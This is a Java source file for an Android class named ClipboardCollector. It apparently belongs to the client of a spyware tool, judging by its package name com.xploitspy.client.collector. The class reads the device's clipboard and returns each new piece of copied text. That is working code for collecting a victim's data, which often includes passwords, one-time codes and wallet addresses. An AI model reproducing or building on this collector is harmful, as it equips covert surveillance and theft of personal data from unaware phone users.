package com.xploitspy.client.collector;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;

/**
 * ClipboardCollector - Mengumpulkan data Clipboard
 */
public class ClipboardCollector {
    
    private static final String TAG = "ClipboardCollector";
    private Context context;
    private ClipboardManager clipboardManager;
    private String lastClipboardContent = "";
    
    public ClipboardCollector(Context context) {
        this.context = context;
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
    }
    
    public String getCurrentClipboard() {
        try {
            if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
                ClipData clipData = clipboardManager.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    CharSequence text = clipData.getItemAt(0).getText();
                    if (text != null) {
                        String content = text.toString();
                        if (!content.equals(lastClipboardContent)) {
                            lastClipboardContent = content;
                            return content;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting clipboard", e);
        }
        return null;
    }
}

